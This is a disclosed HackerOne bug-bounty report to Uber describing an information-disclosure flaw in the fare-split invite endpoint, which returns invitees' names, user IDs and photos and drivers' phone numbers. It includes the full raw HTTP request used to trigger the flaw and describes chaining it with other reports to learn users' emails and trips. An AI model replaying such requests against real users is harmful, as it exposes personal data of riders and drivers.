@@ -1,0 +1,54 @@
+ReportLink:https://hackerone.com/reports/128723
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/r0t1v
+ReportedTo:Uber(uber)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:11.06.2016 16:18:50
+
+Summary:
+
+Fyi, this is my second account since the other one (r0t) is limited to 4 reports and they are all in triage.
+
+So about this issue, when a user is on a trip and invites other users to split the fare, the server responds with info about his number, like: Name, UserID and his picture, and info about the driver: DriverID and mobile number, and other info that is public.
+
+Having this information, combined with other issues that we already reported (#127087, #127158, #127161), we are able to know lots of information about specific users. 
+
+Ex: If we want to know a email address from a specific user, we could use this issue to know his userID and then use the issue #127158 to discover his email, or use issue #127087 to discover his trips.
+
+* REQUEST:
+
+```
+POST /rt/riders/me/invite-fare-split HTTP/1.1
+Host: cn-dc1.oojoovae.org
+x-uber-device-location-altitude: 77.99976
+Connection: close
+x-uber-device-epoch: 1459337709583
+x-uber-device-location-latitude: 38.74049
+X-Uber-DCURL: https://cn-dc1.oojoovae.org/
+x-uber-device-id-tracking-enabled: 1
+x-uber-client-name: client
+X-Uber-RedirectCount: 0
+x-uber-device-os: 7.0.3
+x-uber-device-ids: aaid:D2CD8FE4-8E2A-4CD9-A30F-9996A275D03E
+x-uber-device: iphone
+x-uber-token: a766366d17b4f67af58f41a71d866880
+Accept-Encoding: gzip, deflate
+x-uber-device-location-longitude: -9.14460
+User-Agent: client/iphone/2.125.6
+x-uber-device-language: en
+x-uber-client-id: com.ubercab.UberClient
+x-uber-device-h-accuracy: 65.00000
+Accept: */*
+x-uber-device-model: iPhone4,1
+Accept-Language: en-us
+x-uber-device-v-accuracy: 17.49279
+x-uber-client-version: 2.125.6
+x-uber-device-id: AF90DBCB-D67B-4776-9543-D3A4A15FC3B3
+Content-Type: application/json
+Content-Length: 26
+Cookie: __cfduid=df82beb65119d85a5675640b64437db911458874450
+
+{"invitees":["910000000"]}
+```
